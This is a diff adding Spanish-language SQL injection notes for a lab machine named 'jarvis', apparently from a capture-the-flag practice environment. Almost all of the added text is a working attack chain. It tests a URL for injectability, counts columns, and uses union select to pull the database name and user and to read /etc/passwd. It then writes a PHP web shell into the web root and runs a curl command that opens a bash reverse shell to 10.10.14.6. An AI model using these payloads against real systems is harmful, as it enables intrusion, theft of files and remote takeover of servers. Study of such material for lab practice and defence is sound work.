@@ -33,3 +33,21 @@ enumeracion
 ' or a=a
 ') or ('a'='a
 'hi' or 'x'='x';
+
+En las url para realizar testeo se debe hacer de la siguiete manera
+
+
+'-- - testea si es inyectable la pagina, si regresa la misma página es que si
+-- - testea si es inyectable la pagina, si regresa la misma página es que si
+and 1=1-- - testea si es inyectable la pagina, si regresa la misma página es que si
+and 1=2-- - testea si es inyectable la pagina, si regresa la misma página es que si
+order by 5 Testea el número de tablas, se puede ir aumentando el numero y en el momento en el que deje de mostrar la página es porque ese es el numero máximo.
+use the negative value to prevent the room being selected over our values.
+-1 union select 1,2,3,4,5,6,7 enumerando las tablas se logrará ver en cuales de las tablas se encuentra la inyección
+-1 union select 1, database(),user(),4,5,6,7 al seleccionar las tablas inyectables junto con la sentencia mensionada se podrá ver la base de datos y el usuario.
+-1 union select 1, load_file('/etc/passwd'),3,4,5,6,7 leer archivos.
+-1 union select 1, load_file('/etc/passwd'),3,4,5,6,7 into outfile  '/var/www/html/diego.txt' leer el archivo passwd y escribirlo en un archivo diego.txt
+-1 union select 1,'<?php system($_REQUEST["cmd"]);?>',3,4,5,6,7 into outfile  '/var/www/html/diego.php' escribir una shell simple en un archivo diego.php
+curl -X POST http://10.10.10.143/diego.php --data-urlencode 'cmd=bash -c "bash -i >& /dev/tcp/10.10.14.6/1234 0>&1"' ejecutando comandos con curl y la webshell recientemente subida.
+
+La máquina de este laboratorio es jarvis.
